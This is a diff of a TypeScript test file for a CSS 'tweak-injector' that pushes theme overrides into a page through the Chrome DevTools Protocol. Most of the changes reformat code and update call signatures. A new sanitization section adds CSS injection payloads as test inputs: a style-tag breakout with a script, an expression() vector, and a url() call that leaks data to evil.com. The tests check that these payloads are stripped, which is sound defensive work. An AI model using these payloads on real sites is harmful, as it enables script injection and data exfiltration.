@@ -25,31 +25,30 @@ import type { CdpSession } from '../cdp/cdp-client';
 // Module-level mocks
 // ---------------------------------------------------------------------------
 
-const mockInjectCssLayer = vi.fn<
-  (session: CdpSession, layerName: string, css: string) => Promise<boolean>
->();
+const mockInjectCssLayer =
+  vi.fn<(session: CdpSession, layerName: string, css: string) => Promise<boolean>>();
 
 const mockConnectCdp = vi.fn<(url: string) => Promise<CdpSession>>();
 
 vi.mock('../cdp/injection/shared', () => ({
   injectCssLayer: (...args: unknown[]) =>
-    mockInjectCssLayer(...args as [CdpSession, string, string]),
+    mockInjectCssLayer(...(args as [CdpSession, string, string])),
 }));
 
 vi.mock('../cdp/cdp-client', () => ({
-  connectCdp: (...args: unknown[]) => mockConnectCdp(...args as [string]),
+  connectCdp: (...args: unknown[]) => mockConnectCdp(...(args as [string])),
 }));
 
 // ---------------------------------------------------------------------------
 // Re-import after mocks are declared
 // ---------------------------------------------------------------------------
 
-import {
-  pushTweak,
-  saveTweakAsCustomCss,
-  resetTweak,
-  type TweakSession,
-} from './tweak-injector';
+import { pushTweak, resetTweak, saveTweakAsCustomCss, type TweakSession } from './tweak-injector';
+
+// Silence console.warn/info/error from safe-css sanitizer during tests
+vi.spyOn(console, 'warn').mockImplementation(() => {});
+vi.spyOn(console, 'info').mockImplementation(() => {});
+vi.spyOn(console, 'error').mockImplementation(() => {});
 
 // ---------------------------------------------------------------------------
 // Test fixtures
@@ -58,7 +57,9 @@ import {
 const fakeSession: CdpSession = {
   // Cast through unknown to reconcile vi.fn() (returns Promise<unknown>)
   // with the generic send<T> signature on CdpSession.
-  send: vi.fn<(m: string, p?: Record<string, unknown>) => Promise<unknown>>() as unknown as CdpSession['send'],
+  send: vi.fn<
+    (m: string, p?: Record<string, unknown>) => Promise<unknown>
+  >() as unknown as CdpSession['send'],
   evaluate: vi.fn<(expr: string) => Promise<string>>(),
   close: vi.fn<() => void>(),
 };
@@ -144,9 +145,9 @@ describe('tweak-injector', () => {
     });
 
     it('returns false when CDP target discovery fails (fetch rejects)', async () => {
-      globalThis.fetch = vi.fn<typeof globalThis.fetch>().mockRejectedValue(
-        new Error('ECONNREFUSED'),
-      );
+      globalThis.fetch = vi
+        .fn<typeof globalThis.fetch>()
+        .mockRejectedValue(new Error('ECONNREFUSED'));
       const session = makeSession();
 
       const result = await pushTweak(session, session.overrides);
@@ -157,14 +158,14 @@ describe('tweak-injector', () => {
     });
 
     it('returns false when port has no page target', async () => {
-      globalThis.fetch = vi.fn<typeof globalThis.fetch>().mockResolvedValue(
-        new Response(
-          JSON.stringify([
-            { type: 'service_worker', id: 'sw1', url: 'https://localhost/sw.js' },
-          ]),
-          { status: 200 },
-        ),
-      );
+      globalThis.fetch = vi
+        .fn<typeof globalThis.fetch>()
+        .mockResolvedValue(
+          new Response(
+            JSON.stringify([{ type: 'service_worker', id: 'sw1', url: 'https://localhost/sw.js' }]),
+            { status: 200 },
+          ),
+        );
       const session = makeSession();
 
       const result = await pushTweak(session, session.overrides);
@@ -232,7 +233,11 @@ describe('tweak-injector', () => {
         dirty: true,
       });
 
-      const result = await saveTweakAsCustomCss(session, mockSettings as never);
+      const result = await saveTweakAsCustomCss(
+        session,
+        mockSettings as unknown as Parameters<typeof saveTweakAsCustomCss>[1],
+        session.overrides,
+      );
 
       expect(result).toBe(true);
       expect(session.dirty).toBe(false);
@@ -250,7 +255,11 @@ describe('tweak-injector', () => {
       mockSettings.customThemeCss.mockReturnValue('/* prior CSS */ .foo{color:red}');
       const session = makeSession({ overrides: { accent: '#ff0000' } });
 
-      const result = await saveTweakAsCustomCss(session, mockSettings as never);
+      const result = await saveTweakAsCustomCss(
+        session,
+        mockSettings as unknown as Parameters<typeof saveTweakAsCustomCss>[1],
+        session.overrides,
+      );
 
       expect(result).toBe(true);
       const savedCss = mockSettings.setCustomThemeCss.mock.calls[0][0];
@@ -265,7 +274,11 @@ describe('tweak-injector', () => {
     it('returns false when overrides produce no CSS', async () => {
       const session = makeSession({ overrides: {} });
 
-      const result = await saveTweakAsCustomCss(session, mockSettings as never);
+      const result = await saveTweakAsCustomCss(
+        session,
+        mockSettings as unknown as Parameters<typeof saveTweakAsCustomCss>[1],
+        session.overrides,
+      );
 
       expect(result).toBe(false);
       expect(mockSettings.setCustomThemeCss).not.toHaveBeenCalled();
@@ -274,7 +287,11 @@ describe('tweak-injector', () => {
     it('does not mutate dirty when save is a no-op (empty CSS)', async () => {
       const session = makeSession({ overrides: {}, dirty: true });
 
-      await saveTweakAsCustomCss(session, mockSettings as never);
+      await saveTweakAsCustomCss(
+        session,
+        mockSettings as unknown as Parameters<typeof saveTweakAsCustomCss>[1],
+        session.overrides,
+      );
 
       expect(session.dirty).toBe(true);
     });
@@ -296,9 +313,9 @@ describe('tweak-injector', () => {
     });
 
     it('returns false when CDP session cannot be resolved', async () => {
-      globalThis.fetch = vi.fn<typeof globalThis.fetch>().mockRejectedValue(
-        new Error('ECONNREFUSED'),
-      );
+      globalThis.fetch = vi
+        .fn<typeof globalThis.fetch>()
+        .mockRejectedValue(new Error('ECONNREFUSED'));
 
       const result = await resetTweak('traework', 9336);
 
@@ -364,7 +381,7 @@ describe('tweak-injector', () => {
       const css = mockInjectCssLayer.mock.calls[0][2];
       expect(css.startsWith(':root{')).toBe(true);
       expect(css.endsWith('}')).toBe(true);
-      expect(css).toMatch(/^\:root\{--as\-radius:4px\}$/);
+      expect(css).toMatch(/^:root\{--as-radius:4px\}$/);
     });
 
     it('shadowLevel "none" produces no --as-shadow property', async () => {
@@ -407,6 +424,104 @@ describe('tweak-injector', () => {
 
       // All fields produce no CSS → pushTweak returns false early
       expect(result).toBe(false);
+    });
+  });
+
+  // ========================================================================
+  // Security — CSS sanitization
+  // ========================================================================
+  describe('CSS sanitization', () => {
+    it('strips malicious </style><script> breakout payload from fontFam', async () => {
+      const session = makeSession({
+        overrides: { fontFam: '");}</style><script>alert(1)</script><style>/*' },
+      });
+
+      const result = await pushTweak(session, session.overrides);
+
+      // The dangerous content is sanitized; the remaining CSS (if any safe
+      // declarations survive) is injected without the breakout.
+      const css = mockInjectCssLayer.mock.calls[0]?.[2] ?? '';
+      expect(css).not.toContain('</style>');
+      expect(css).not.toContain('<script>');
+      expect(result).toBe(css.length > 0);
+    });
+
+    it('strips expression() (IE-old CSS injection vector)', async () => {
+      const session = makeSession({
+        overrides: { accent: 'red; expression(alert(1))' },
+      });
+
+      const result = await pushTweak(session, session.overrides);
+
+      if (result) {
+        const css = mockInjectCssLayer.mock.calls[0][2];
+        expect(css).not.toContain('expression');
+      }
+    });
+
+    it('blocks external url() data exfil vectors', async () => {
+      const session = makeSession({
+        overrides: { accent: 'red; background: url(https://evil.com/?leak=1)' },
+      });
+
+      const result = await pushTweak(session, session.overrides);
+
+      if (result) {
+        const css = mockInjectCssLayer.mock.calls[0][2];
+        expect(css).not.toMatch(/url\s*\(\s*['"]?https?:/i);
+      }
+    });
+
+    it('passes clean color values through unchanged', async () => {
+      const session = makeSession({
+        overrides: { accent: '#3b82f6', background: '#1e1e1e' },
+      });
+
+      await pushTweak(session, session.overrides);
+
+      const css = mockInjectCssLayer.mock.calls[0][2];
+      expect(css).toContain('--as-accent:#3b82f6');
+      expect(css).toContain('--as-bg:#1e1e1e');
+    });
+  });
+
+  // ========================================================================
+  // saveTweakAsCustomCss — error path
+  // ========================================================================
+  describe('saveTweakAsCustomCss error handling', () => {
+    it('returns false when setCustomThemeCss throws', async () => {
+      mockSettings.setCustomThemeCss.mockRejectedValue(new Error('IPC timeout'));
+      const session = makeSession({
+        overrides: { radius: '4px' },
+        dirty: true,
+      });
+
+      const result = await saveTweakAsCustomCss(
+        session,
+        mockSettings as unknown as Parameters<typeof saveTweakAsCustomCss>[1],
+        session.overrides,
+      );
+
+      expect(result).toBe(false);
+      // dirty must stay true because the save failed
+      expect(session.dirty).toBe(true);
+    });
+
+    it('preserves explicit overrides parameter (not session.overrides)', async () => {
+      const session = makeSession({
+        overrides: { radius: 'OLD' }, // stale session value
+      });
+      const freshOverrides = { accent: '#fresh' };
+
+      await saveTweakAsCustomCss(
+        session,
+        mockSettings as unknown as Parameters<typeof saveTweakAsCustomCss>[1],
+        freshOverrides,
+      );
+
+      const savedCss = mockSettings.setCustomThemeCss.mock.calls[0][0];
+      expect(savedCss).toContain('--as-accent:#fresh');
+      expect(savedCss).not.toContain('--as-radius:OLD');
     });
   });
 });
